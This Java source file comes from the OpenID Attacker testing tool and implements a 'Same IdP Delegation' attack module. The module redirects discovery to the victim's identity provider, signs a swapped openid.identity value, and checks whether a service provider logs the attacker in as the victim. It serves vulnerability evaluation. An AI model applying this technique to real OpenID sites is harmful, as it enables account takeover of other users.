/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import org.apache.commons.lang3.SerializationUtils;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameterKeeper;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.discovery.html.HtmlDiscoveryConfiguration;
import wsattacker.sso.openid.attacker.discovery.xrds.XrdsConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;

public class SameIdpDelegationAttack extends AbstractAttack {
    
    private HtmlDiscoveryConfiguration htmlConfigCopy;
    private XrdsConfiguration xrdsConfigCopy;

    public SameIdpDelegationAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Override
    protected void beforeAttack() {
        super.beforeAttack();
            
        // copy of HTML and XRDS Discovery information by serialization
        htmlConfigCopy = SerializationUtils.clone(serverController.getConfig().getHtmlConfiguration());
        xrdsConfigCopy = SerializationUtils.clone(serverController.getConfig().getXrdsConfiguration());    
    }

    @Override
    protected void afterAttack() {
        super.afterAttack();
        
        // reset HTML and XRDS Discovery information
        serverController.getConfig().setHtmlConfiguration(htmlConfigCopy);
        serverController.getConfig().setXrdsConfiguration(xrdsConfigCopy);
    }
    
    @Attack
    private AttackResult performSameIdpDelegationAttack() {
        // set IdP of the discovery document of attacker's IdP
        String victimIdp = serverController.getAnalyzerConfig().getXrdsConfiguration().getBaseUrl();
        serverController.getAttackerConfig().getHtmlConfiguration().setBaseUrl(victimIdp);
        serverController.getAttackerConfig().getXrdsConfiguration().setBaseUrl(victimIdp);
        
        // set second identity to the attacker's OpenID
        OpenIdServerConfiguration.getAnalyzerInstance().setPerformAttack(true);
        
        String attackerIdentity = serviceProvider.getAttackerOpenId();
        
        AttackParameterKeeper victimKeeper = serverController.getAnalyzerServer().getParameterConfiguration();
        
        AttackParameter claimedIdParameter = victimKeeper.getParameter("openid.identity");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue(attackerIdentity);
        
        // include modified parameter in signature
        AttackParameter sigParameter = victimKeeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.login(User.ATTACKER);
        
        boolean success = serviceProvider.determineAuthenticatedUser(loginResult.getPageSource(), loginResult.getUrlAfterLogin()) == ServiceProvider.User.VICTIM;
        AttackResult.Result result = success ? AttackResult.Result.SUCCESS : AttackResult.Result.FAILURE;
        AttackResult.Interpretation interpretation = success ? AttackResult.Interpretation.CRITICAL : AttackResult.Interpretation.PREVENTED;        
        
        //assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("Same IdP Delegation Attack", loginResult, result, interpretation);
    }
}
